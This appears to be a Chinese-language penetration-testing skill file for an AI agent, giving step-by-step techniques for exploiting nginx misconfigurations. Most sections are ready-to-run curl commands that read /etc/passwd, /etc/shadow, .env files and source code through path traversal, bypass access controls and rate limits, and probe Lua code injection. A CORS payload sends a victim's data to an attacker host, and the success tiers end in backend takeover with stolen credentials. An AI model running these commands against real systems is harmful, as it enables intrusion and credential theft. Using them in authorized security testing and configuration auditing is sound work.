---
name: nginx-misconfig
description: >-
 Nginx 配置错误完整手法：off-by-slash 路径穿越、alias 目录穿越读源码、
 不安全的 try_files、CORS 误配置反射、X-Accel-Redirect SSRF、
 lua_code_cache off RCE、merge_slashes off 绕过、
 add_header 覆盖 Security Headers、WebSocket 代理注入。
 用户提到 nginx 路径穿越、alias 穿越、off-by-slash、
 try_files 绕过、nginx 配置审计时使用。
 WAF/挑战页走 waf-js-challenge-bypass；nginx CVE 走 nginx-rift。
version: 1.0.0
tags: [....//, 归一化]
---

# Nginx 配置错误渗透手法

**前提**：目标在 `config/scope*.json`。

---

## 快速摸底

```bash
# 识别 nginx 指纹
curl -si https://授权站/ | grep -iE "server:|x-powered|via:|x-cache"

# 测试常见路径穿越
curl -s "https://授权站/static../" -v
curl -s "https://授权站/static../etc/passwd" -v
```

---

## §1 Off-by-Slash（最高频）

**漏洞配置**：
```nginx
location /api {
 proxy_pass http://backend; # 没有尾部 /
}
```

**利用**：nginx 会将 `/api../etc/passwd` 规范化，可穿越到不允许的路径。

```bash
# 检测 off-by-slash
curl -s "https://授权站/api../" -v # 200 = 可能存在
curl -s "https://授权站/api../private" # 测试内部路径

# 常见绕过变体
/api..;/private # 分号路径（Tomcat/Jetty）
/api%2f../private # URL 编码斜杠
/api%252f../private # 双重编码
/%2e%2e/private # 编码点
```

---

## §2 Alias 路径穿越（读取任意文件）

**漏洞配置**：
```nginx
location /static {
 alias /var/www/html/static/; # location 没有尾部 /
}
```

**利用**：访问 `/static../` 会跳出 static 目录。

```bash
# 基础穿越
curl -s "https://授权站/static../etc/passwd"
curl -s "https://授权站/static../" # 列目录
curl -s "https://授权站/static../nginx.conf"

# 读取 PHP 源码
curl -s "https://授权站/static../app.php"
curl -s "https://授权站/static../config.php"
curl -s "https://授权站/static../.env"
curl -s "https://授权站/static../vendor/autoload.php"

# 特殊路径
curl -s "https://授权站/static../proc/self/environ"
curl -s "https://授权站/static../proc/self/cmdline"

# 批量目标文件清单
for f in /etc/passwd /etc/shadow /etc/nginx/nginx.conf /var/www/html/.env; do
 echo "=== $f ===" && curl -sk "https://授权站/static..$f"
done
```

---

## §3 Merge Slashes Off（路径规范化绕过）

**漏洞配置**：
```nginx
merge_slashes off; # 禁止合并连续斜杠
```

**利用**：`//admin` 不等于 `/admin`，前端代理识别为正常路径，后端收到 `//admin`。

```bash
# 绕过访问控制
curl -s "https://授权站//admin"
curl -s "https://授权站//api//v1//users"
curl -s "https://授权站/./admin/"
curl -s "https://授权站/%2f%2fadmin"

# 联合 WAF 绕过
curl -s "https://授权站//uploads//shell.php"
```

---

## §4 不安全的 try_files 配置

```nginx
# 漏洞配置 1：try_files 到 PHP 执行
location / {
 try_files $uri $uri/ /index.php$is_args$args;
}

# 漏洞配置 2：静态文件 fallback 可被滥用
location ~* \.(js|css)$ {
 try_files $uri =404;
}
# → 上传 .js 文件包含 PHP 代码后 try_files fallback 到 PHP 处理
```

```bash
# 测试 try_files fallback
curl -s "https://授权站/non-existent?debug=true" # 可能触发 debug 页

# phpinfo 探测
curl -s "https://授权站/phpinfo.php"
curl -s "https://授权站/info.php"
curl -s "https://授权站/test.php"
```

---

## §5 X-Accel-Redirect SSRF（内部资源绕过）

```bash
# nginx 的 X-Accel-Redirect 头允许后端指示 nginx 转发请求
# 如果后端将用户输入传入 X-Accel-Redirect 响应头

# 测试是否存在 XAR
curl -s "https://授权站/download?file=/etc/passwd" -v | grep -i "x-accel"

# SSRF via XAR（后端盲 SSRF 不如这个精准）
# 触发内部路径：/internal/ /private/ /admin/ @backend/
```

---

## §6 CORS 配置错误（nginx 层）

```nginx
# 漏洞配置 1：完全反射 Origin
add_header 'Access-Control-Allow-Origin' $http_origin;
add_header 'Access-Control-Allow-Credentials' 'true';

# 漏洞配置 2：Origin 正则错误（允许 evil.victim.com）
if ($http_origin ~* "victim\.com$") {
 add_header 'Access-Control-Allow-Origin' $http_origin;
}
```

```bash
# 测试 Origin 反射
curl -s "https://授权站/api/user" \
 -H "Origin: https://evil.com" \
 -H "Authorization: Bearer $TOKEN" -v | grep -i "access-control"

# 测试子域绕过
curl -s "https://授权站/api/user" \
 -H "Origin: https://evil.victim.com" -v | grep -i access-control

# 利用（配合 CSRF）
javascript: fetch('https://授权站/api/user', {credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker/'+btoa(JSON.stringify(d))))
```

---

## §7 add_header 继承覆盖（Security Headers 丢失）

**漏洞**：子 location 块的 `add_header` 会覆盖父块的所有 `add_header`。

```nginx
# nginx.conf（父）
add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;

# site.conf（子 location）
location /api {
 add_header Cache-Control no-cache; # 这里只有这一个！前两个丢失
 proxy_pass http://backend;
}
```

```bash
# 检测 Security Headers 缺失
curl -si "https://授权站/api/anything" | grep -iE "x-frame|x-content-type|csp|hsts|x-xss"

# 若 /api/ 路径缺失 X-Frame-Options，可 Clickjacking
```

---

## §8 limit_req / limit_conn 绕过

```bash
# 常见限流绕过
# 大写 HTTP 方法不在限流规则
curl -X "GET" "https://授权站/login" vs curl -X "gEt" "https://授权站/login"

# 路径变体绕过
curl "https://授权站/login" vs curl "https://授权站/login/"

# 附加参数绕过（不在 key 里的参数）
curl "https://授权站/login?_=1234"

# X-Forwarded-For 伪造（仅当 nginx 信任 XFF）
curl -H "X-Forwarded-For: 1.1.1.1" "https://授权站/login"
# 或枚举
for i in $(seq 1 100); do
 curl -s -H "X-Forwarded-For: 10.0.0.$i" -o /dev/null -w "%{http_code}\n" \
 "https://授权站/api/login"
done
```

---

## §9 Nginx Lua / OpenResty 注入

```bash
# 检测 OpenResty
curl -si https://授权站/ | grep -i "openresty\|lua\|resty"

# lua_code_cache off（开发模式）→ Lua 脚本热重载，若有上传可 RCE
# content_by_lua_block 中的用户输入未过滤 → Lua 代码注入

# 注入测试（若端点接收 Lua 模板）
curl -s "https://授权站/render?tmpl=os.execute('id')"
```

---

## §10 自动化扫描

```bash
# nikto（快速误配检测）
nikto -h https://授权站 -ssl -Tuning 7

# nuclei nginx 模板
nuclei -u https://授权站 -tags nginx -severity medium,high,critical

# nginxpwner（专用）
git clone https://github.com/stark0de/nginxpwner
python3 nginxpwner.py https://授权站 /wordlist.txt

# 手工 checklist
for path in "/../etc/passwd" "/%2e%2e/etc/passwd" "/..%2Fetc%2Fpasswd" "/%252e%252e/etc/passwd"; do
 echo -n "$path → "
 curl -sk "https://授权站$path" | head -c 80
 echo
done
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 发现配置项（alias/off-by-slash/CORS） |
| L2 | 读取任意文件（/etc/passwd/.env/源码） |
| L3 | 利用读到的凭据接管后端 |

---

## 真源

- 手法：`docs/playbooks/核心Web漏洞面作业手法.md`
- 工具：`python3 tools/ops/core_web_surface_probe.py --help`


---

## 外部库增量（2026-10-11 分享包）

## §11 DocumentRoot 错位（项目根 = Web 根 → 源码/凭据裸奔）

**漏洞配置**（Laravel/ThinkPHP 类框架最常见，宝塔一键部署也会踩）:
```nginx
# 错：指到项目根，而不是项目的 public/
root /www/project/mysite;          # 应为 /www/project/mysite/public
```

```bash
# 三连探针（响应体特征二次确认，防「未知路径统一回落到 index.php」的假阳性）
curl -s https://授权站/.env | head -3                              # 命中: APP_NAME=/APP_KEY= → 全量凭据
curl -s https://授权站/config/database.php | head -5               # 配置明文
curl -so /dev/null -w '%{http_code}\n' https://授权站/vendor/autoload.php   # 200 = vendor 可执行
curl -so /dev/null -w '%{http_code}\n' https://授权站/storage/framework/views/xxx.php  # 500 = PHP 真在解析
curl -s https://授权站/resources/views/home.blade.php | head -5     # 200 = 模板明文
curl -s https://授权站/storage/logs/laravel.log | tail -20          # 日志常含 SQL/路径/凭据
```

拿到裸源码/`.env` 之后的完整后链（凭据收割→打包源码→同服横向→后门）见 `cms-updater-zip-extract-rce`（含产品级作战地图）。

**同一类错位的其它表现**（一并测）: 备份产物落在 web 根（`.sql`/`.zip`/`*.bak`）、`composer.json`/`package.json`/`.git/` 直读、`uploads/` 下 PHP 直解析。

**✓ 控制手段**: `curl` 任何一个 `*.php` 返回的是**执行结果**（空/报错/HTML），而 `*.blade.php`/`*.env` 返回**原文** —— 两者同时成立才能定“DocumentRoot 错位”。

## 穿越段归一化次序差（2026-10 多目标）
- `....//....//app/.env` 四段：每两段 `..` + `//`，被过滤掉一层后仍剩 `../`，专治“只删一次”的正则
- 跨站绝对路径二次编码：`/static/..%2f..%2f..%2fapp/.env`；先 `..%2f` 再整体 `%25` → 服务端解码一次正好穿越
- 判据：`../` 被 400 / `..%2f` 回 404 / `....//` 回 200 = 过滤只做单次字符串替换

---
